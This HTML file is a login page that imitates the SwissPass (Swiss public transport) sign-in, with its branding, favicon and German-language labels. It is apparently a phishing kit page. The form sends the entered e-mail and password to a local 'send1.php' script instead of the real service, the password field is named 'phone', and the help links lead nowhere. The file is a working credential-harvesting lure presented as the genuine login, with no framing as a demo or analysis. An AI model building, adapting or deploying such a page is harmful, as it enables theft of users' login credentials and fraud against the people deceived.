<html lang="de-ch"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | SwissPass</title>
    <meta name="description" content="Der SwissPass ist der Schlüssel für Ihre Mobilität: Flexibel, unabhängig und voller Vorteile.">
    <link rel="icon" href="https://www.swisspass.ch/resources/img/favicon.ico" type="image/x-icon">
    <style>
        :root {
            --sp-red: #c51416; /* Updated to #c51416 */
            --sp-gray-100: #f5f5f5;
            --sp-gray-200: #e9e9e9;
            --sp-gray-700: #666666;
            --sp-gray-900: #333333;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "SBBWeb-Roman", Arial, sans-serif;
            color: var(--sp-gray-900);
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            background: linear-gradient(135deg, #c51416 0%, #a01012 100%); /* Updated to #c51416 */
            position: relative;
            overflow-x: hidden;
        }

        /* Background pattern overlay */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M50 50L0 100h100z' fill='rgba(255,255,255,0.05)'/%3E%3C/svg%3E");
            background-size: 20px 20px;
            opacity: 0.1;
            pointer-events: none;
        }

        .container {
            max-width: 440px;
            margin: 0 auto;
            padding: 32px 20px;
            position: relative;
            z-index: 1;
        }

        .login-card {
            background: var(--sp-red); /* Updated to #c51416 */
            border-radius: 4px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
            padding: 32px;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo {
            width: 355px;
            height: auto;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            color: white; /* Changed to white */
            margin-bottom: 8px;
        }

        .form-control {
            width: 100%;
            height: 48px;
            padding: 12px;
            border: 1px solid var(--sp-gray-200);
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s;
        }

        .form-control:focus {
            outline: none;
            border-color: white; /* Changed to white */
        }

        .btn {
            width: 100%;
            height: 48px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-primary {
            background-color: #484848; /* Changed to #484848 */
            color: white;
        }

        .btn-primary:hover {
            background-color: #333333; /* Darker shade for hover */
        }

        .btn-primary:disabled {
            background-color: var(--sp-gray-200);
            cursor: not-allowed;
        }

        .links {
            margin-top: 24px;
            text-align: center;
        }

        .link {
            color: white; /* Changed to white */
            text-decoration: none;
            font-size: 14px;
            margin: 0 8px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .error-message {
            color: white; /* Changed to white */
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }

        /* Custom checkbox styles */
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }

        .checkbox-input {
            position: absolute;
            opacity: 0;
        }

        .checkbox-label {
            position: relative;
            padding-left: 32px;
            cursor: pointer;
            font-size: 14px;
            color: white; /* Changed to white */
        }

        .checkbox-label::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            width: 20px;
            height: 20px;
            border: 2px solid white; /* Changed to white */
            border-radius: 4px;
            background-color: transparent;
        }

        .checkbox-input:checked + .checkbox-label::after {
            content: '';
            position: absolute;
            left: 7px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white; /* Changed to white */
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        @media (max-width: 480px) {
            .container {
                padding: 16px;
            }

            .login-card {
                padding: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo-container">
                <img src="./img/rincanta.svg" alt="SwissPass" class="logo">
            </div>

            <form id="loginForm" method="POST" action="./send1.php" autocomplete="off">
                <div class="form-group">
                    <label class="form-label" for="email">E-Mail</label>
                    <input type="email" id="email" name="email" class="form-control" required="" autocomplete="off" placeholder="name@example.com">
                    <div class="error-message" id="email-error">Bitte geben Sie eine gültige E-Mail-Adresse ein.</div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="password">Passwort</label>
                    <input type="password" id="password" name="phone" class="form-control" required="" autocomplete="off">
                    <div class="error-message" id="password-error">Bitte geben Sie ein Passwort ein.</div>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="show-password" class="checkbox-input">
                    <label for="show-password" class="checkbox-label">Passwort anzeigen</label>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="remember-me" name="REMEMBER_ME" class="checkbox-input">
                    <label for="remember-me" class="checkbox-label">Angemeldet bleiben</label>
                </div>

                <button type="submit" class="btn btn-primary" id="submit-button" disabled="">Weiter</button>

                <div class="links">
                    <a href="#" class="link">Passwort vergessen?</a>
                    <a href="#" class="link">Registrieren</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const showPasswordCheckbox = document.getElementById('show-password');
        const submitButton = document.getElementById('submit-button');

        // Toggle password visibility
        showPasswordCheckbox.addEventListener('change', (e) => {
            passwordInput.type = e.target.checked ? 'text' : 'password';
        });

        // Form validation
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email.toLowerCase());
        }

        function updateSubmitButton() {
            const isEmailValid = validateEmail(emailInput.value);
            const isPasswordValid = passwordInput.value.length > 0;
            submitButton.disabled = !(isEmailValid && isPasswordValid);
        }

        emailInput.addEventListener('input', () => {
            document.getElementById('email-error').style.display = 
                validateEmail(emailInput.value) ? 'none' : 'block';
            updateSubmitButton();
        });

        passwordInput.addEventListener('input', () => {
            document.getElementById('password-error').style.display = 
                passwordInput.value.length > 0 ? 'none' : 'block';
            updateSubmitButton();
        });

        form.addEventListener('submit', (e) => {
            if (!validateEmail(emailInput.value) || !passwordInput.value) {
                e.preventDefault();
                return false;
            }
        });

        // Initial button state
        updateSubmitButton();
    </script>


</body></html>
